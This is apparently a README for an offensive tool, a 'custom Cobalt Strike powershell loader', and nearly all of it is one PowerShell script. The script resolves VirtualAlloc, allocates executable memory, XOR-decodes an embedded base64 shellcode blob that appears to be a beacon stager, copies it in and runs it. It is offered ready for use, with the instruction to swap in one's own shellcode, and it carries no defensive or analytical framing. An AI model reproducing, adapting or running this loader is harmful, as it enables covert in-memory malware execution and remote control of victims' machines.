# PowerShell Loader

Custom Cobalt Strike powershell loader.

Simply swap out your shellcode

```
Set-StrictMode -Version 2

function func_get_proc_address {
    param(
        [string]$var_module,
        [string]$var_procedure
    )
  
    Add-Type @"
using System;
using System.Runtime.InteropServices;
  
public static class NativeMethods {
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string moduleName);
  
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
}
"@
    $hModule = [NativeMethods]::GetModuleHandle($var_module)
    if ($hModule -eq [IntPtr]::Zero) { return $null }
    $ptr = [NativeMethods]::GetProcAddress($hModule, $var_procedure)
    return $ptr
}

function func_get_delegate_type {
    param(
        [Parameter(Mandatory=$true)]
        [Type[]] $var_parameters,
        [Type] $var_return_type = [Void]
    )

    $assemblyName = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        $assemblyName,
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $ctor = $typeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $var_parameters
    )
    
    $ctor.SetImplementationFlags('Runtime, Managed')

    $invokeMethod = $typeBuilder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $var_return_type,
        $var_parameters
    )

    $invokeMethod.SetImplementationFlags('Runtime, Managed')

    return $typeBuilder.CreateType()
}

If ([IntPtr]::size -eq 8) {
        [Byte[]]$v = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDBYaWlUjL64Vm6eZ8uudBBZF7VnGxiUDLcDEYJjdogi2LllSHbG/7MN9YlnKZhkjhs3elotSgmc14v2cMOCeoyj2yXdZfuoDwSlET72N4iN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN0bHQVFxgDd1FKR0ZNVwwWDRMYA2FsamYaGHB1cGYKLikjtZEpu2S6kcKE0qTfv3xJxAFRivtbDg1VYtqzJvioTipd9bN00Hudi4beg1Bbezy9o2dwX1CoazrE/jJPDoqsuea5ghIzbTSiktl33+1sY13Cx8nDIGczUXOuo+fP6QQmjUDCSJAI4GOHy8bxMzVOUgZSaAe+FWatj5b0V8ilLsxtnD+6DtE/2djkpZirfC5ifgkgvVvIXgatnHTj0FIXaGdJH6u59nxwLEl6Cpa8Fii0udlo/3PmveP0MohS+VrobgrelGLmDeT+48FFsJojYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BIaEQ0SFRsNEhYNERETIyMipYM=')

        $i = 0
        while (-not ($i -ge $v.Count)) {
            $v[$i] = $v[$i] -bxor 35
            $i += 1
        }

        # Get pointer to VirtualAlloc
        $va_ptr = func_get_proc_address "kernel32.dll" "VirtualAlloc"
        if ($va_ptr -eq [IntPtr]::Zero) {
            throw "GetProcAddress failed for VirtualAlloc"
        }

        # Build correct delegate type: (IntPtr, UInt32, UInt32, UInt32) -> IntPtr
        $va_delegate_type = func_get_delegate_type `
            @([IntPtr], [UInt32], [UInt32], [UInt32]) `
            ([IntPtr])

        # Convert pointer to delegate
        $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $va_ptr,
            $va_delegate_type
        )

        # Actually allocate memory
        $var_buffer = $var_va.Invoke(
            [IntPtr]::Zero,
            $v.Length,
            0x3000,   # MEM_COMMIT | MEM_RESERVE
            0x40      # PAGE_EXECUTE_READWRITE
        )

        if ($var_buffer -eq [IntPtr]::Zero) {
            throw "VirtualAlloc returned NULL"
        }

        # Copy payload bytes
        [System.Runtime.InteropServices.Marshal]::Copy($v, 0, $var_buffer, $v.Length)

        # Create delegate for the shellcode entry point
        $runme_delegate_type = func_get_delegate_type @([IntPtr]) ([Void])
        $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $var_buffer,
            $runme_delegate_type
        )

        # Execute
        $var_runme.Invoke([IntPtr]::Zero)
}
```
